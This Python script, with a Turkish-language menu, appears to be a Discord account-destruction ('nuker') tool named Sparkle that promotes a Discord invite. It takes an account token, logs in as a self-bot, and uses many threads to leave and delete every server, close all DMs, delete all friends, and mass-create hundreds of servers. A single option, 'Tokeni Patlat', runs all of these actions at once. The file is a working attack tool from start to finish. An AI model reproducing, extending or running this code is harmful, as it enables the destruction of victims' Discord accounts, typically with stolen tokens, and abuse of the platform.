import requests, os, threading, discord, time
from colorama import Fore
from colored import fg, attr
from discord.ext import commands
from pypresence import Presence
b = Fore.LIGHTBLACK_EX
r = Fore.RESET
g = fg('#00ff00')

clear = lambda: os.system('cls') if os.name == 'nt' else os.system('clear')

RPC = Presence("935976521875730462")
RPC.connect()
RPC.update(state='Welcome To Our Hell', details='discord.gg/TCyGay6ADE', large_image='largerimage',small_image="smallimage",large_text="discord.gg/TCyGay6ADE",small_text="Welcome To Our Hell")

os.system(f'title Sparkle Menü │ Token Bekleniyor')
client = commands.Bot(command_prefix=".", self_bot= True)

def login(token):
    data = {}
    
    @client.event
    async def on_ready():
      try:
         os.system(f'title Sparkle │ Bağlanılan Hesap: {client.user.name}#{client.user.discriminator}')
         RPC.close()
         RPC.connect()
         RPC.update(state='Welcome To Our Hell', details='discord.gg/TCyGay6ADE', large_image='largerimage',small_image="smallimage",large_text="discord.gg/TCyGay6ADE",small_text="Welcome To Our Hell")
      except Exception as e:
         pass
        
      data['guildsID'] = [guild.id for guild in client.guilds]
      data['friendsID'] = [freind.id for freind in client.user.friends]
      data['channelsID'] = [channel.id for channel in client.private_channels]
       
      await client.close()
    try:
        client.run(token, bot=False)
    except Exception as error:
        print(f"[{g}~{r}] {g}Geçersiz Token{r}", error)
        return None
    return data

def menu():
   print(f'''

                                     {b}██████{g}╗{b}██████{g}╗  {b}█████{g}╗ {b}██████{g}╗ {b}██{g}╗  {b}██{g}╗{b}██{g}╗     {b}███████{g}╗
                                    {b}██{g}╔════╝{b}██{g}╔══{b}██{g}╗{b}██{g}╔══{b}██{g}╗{b}██{g}╔══{b}██{g}╗{b}██{g}║ {b}██{g}╔╝{b}██{g}║     {b}██{g}╔════╝
                                    {g}╚{b}█████{g}╗ {b}██████{g}╔╝{b}███████{g}║{b}██████{g}╔╝{b}█████{g}═╝ {b}██{g}║     {b}█████{g}╗  
                                     {g}╚═══{b}██{g}╗{b}██{g}╔═══╝ {b}██{g}╔══{b}██{g}║{b}██{g}╔══{b}██{g}╗{b}██{g}╔═{b}██{g}╗ {b}██{g}║     {b}██{g}╔══╝  
                                    {b}██████{g}╔╝{b}██{g}║     {b}██{g}║  {b}██{g}║{b}██{g}║  {b}██{g}║{b}██{g}║ {g}╚{b}██{g}╗{b}███████{g}╗{b}███████{g}╗
                                    {g}╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
                                           ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{r}  
''')

def menu2():
   print(f'''

                                    {b}██████{g}╗{b}██████{g}╗  {b}█████{g}╗ {b}██████{g}╗ {b}██{g}╗  {b}██{g}╗{b}██{g}╗     {b}███████{g}╗
                                   {b}██{g}╔════╝{b}██{g}╔══{b}██{g}╗{b}██{g}╔══{b}██{g}╗{b}██{g}╔══{b}██{g}╗{b}██{g}║ {b}██{g}╔╝{b}██{g}║     {b}██{g}╔════╝
                                   {g}╚{b}█████{g}╗ {b}██████{g}╔╝{b}███████{g}║{b}██████{g}╔╝{b}█████{g}═╝ {b}██{g}║     {b}█████{g}╗  
                                    {g}╚═══{b}██{g}╗{b}██{g}╔═══╝ {b}██{g}╔══{b}██{g}║{b}██{g}╔══{b}██{g}╗{b}██{g}╔═{b}██{g}╗ {b}██{g}║     {b}██{g}╔══╝  
                                   {b}██████{g}╔╝{b}██{g}║     {b}██{g}║  {b}██{g}║{b}██{g}║  {b}██{g}║{b}██{g}║ {g}╚{b}██{g}╗{b}███████{g}╗{b}███████{g}╗
                                   {g}╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
                                     {g}╔═════════════════════╗     ╔═════════════════════╗
                                     ║{r}discord.gg/TCyGay6ADE{g}║     ║{r}discord.gg/TCyGay6ADE{g}║
                                    ╔═══════════════════════╗   ╔════════════════════════╗
                                    ║{r}1 {g}:{r}Tokeni Patlat       {g}║   ║{r}5 {g}:{r}Arkadaşları Sil      {g}║
                                    ║{r}2 {g}:{r}Sunuculardan Çık    {g}║   ║{r}6 {g}:{r}Sunucu Oluştur       {g}║
                                    ║{r}3 {g}:{r}Dm'leri Kapat       {g}║   ║{r}7 {g}:{r}cls [konsolu temizle]{g}║ 
                                    ║{r}4 {g}:{r}Sunucuları Sil      {g}║   ║{r}8 {g}:{r}boş                  {g}║
                                    ╚═══════════════════════╝   ╚════════════════════════╝{r}  
''')
menu2()
def leaveG(guild_id, token,):
   
      try:
         re = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}DURUM{r}] {g}Çıkış Sağlandı {r}>> [ {g}{guild_id} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}DURUM{r}] {g}Çıkış Sağlanamadı {r}>> [ {g}{guild_id} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         return

def createG(name, token, i,):
   
      try:
         payload = {'name': f'{name}', 'region': 'europe', 'icon': None, 'channels': None}
         re = requests.post('https://discord.com/api/v6/guilds', headers={"Authorization": token}, json=payload)
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}DURUM{r}] {g}Sunucu Oluşturuldu {r}>> [ {g}{name} {r}] {g}Servers{r}")
         elif re.status_code == 429:
            print(f"{r}[{g}DURUM{r}] {g}Sunucu Oluşturulamadı{r}>> [ {g}{name} {i}{r} ]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         return
def deleteG(guild,token,):
   
      try:
         re = requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}DURUM{r}] {g}Sunucu Silindi {r}>> [ {g}{guild} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}DURUM{r}] {g}Sunucu Silinemedi {r}>> [ {g}{guild} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass
def closeD(id, token):
   
      try:
         re = requests.delete(f"https://discord.com/api/v8/channels/{id}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}DURUM{r}] {g}DM Kapatıldı {r}>> [ {g}{id} {r}] DMS")
         elif re.status_code == 429:
            print(f"{r}[{g}DURUM{r}] {g}DM Kapatılamadı {r}>> [ {g}{id} {r}] DMS")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass
def deleteF(friend, token):
   
      try:
         re = requests.delete(f"https://discord.com/api/v8/users/@me/relationships/{friend}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}DURUM{r}] {g}Arkadaş Silindi {r}>> [ {g}{id} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}DURUM{r}] {g}Arkadaş Silinemedi{r}>> [ {g}{id} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass
   

def start():
   while True:
      answer = input(f'{r}[{g}~{r}] {g}Seçim{r}: ')
      if answer == '1':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         acc = login(token)
         RPC.close()
         RPC.connect()
         RPC.update(state='Welcome To Our Hell', details='discord.gg/TCyGay6ADE', large_image='largerimage',small_image="smallimage",large_text="discord.gg/TCyGay6ADE",small_text="Welcome To Our Hell")
         num = 300
         name = input(f"{g}Sunucu Adı{r}:")
         clear()
         menu()
         for guild in acc['guildsID']:
            threading.Thread(target=leaveG, args=(guild, token,)).start()
         for guild in acc['guildsID']:
            threading.Thread(target=deleteG, args=(guild, token,)).start()
         for i in range(int(num)):
            threading.Thread(target=createG, args=(name, token, i,)).start()
         for id in acc['channelsID']:
            threading.Thread(target=closeD, args=(id, token,)).start()
         for friend in acc['friendsID']:
            threading.Thread(target=deleteF, args=(friend, token,)).start()
      elif answer == '2':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         acc = login(token)
         for guild in acc['guildsID']:
            threading.Thread(target=leaveG, args=(guild, token,)).start()
      elif answer == '3':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         acc = login(token)
         for id in acc['channelsID']:
            threading.Thread(target=closeD, args=(id, token,)).start()
      elif answer == '4':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         acc = login(token)
         for guild in acc['guildsID']:
            threading.Thread(target=deleteG, args=(guild, token,)).start()
      elif answer == '5':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         acc = login(token)
         for friend in acc['friendsID']:
            threading.Thread(target=deleteF, args=(friend, token,)).start()
      elif answer == '6':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         num = 200
         name = input(f"{g}Sunucu Adı{r}:")
         clear()
         menu()
         acc = login(token)
         for i in range(int(num)):
            threading.Thread(target=createG, args=(name, token, i,)).start()
      elif answer == 'cls':
         clear()
         menu2()


      
             
      
if __name__ == '__main__':
   start()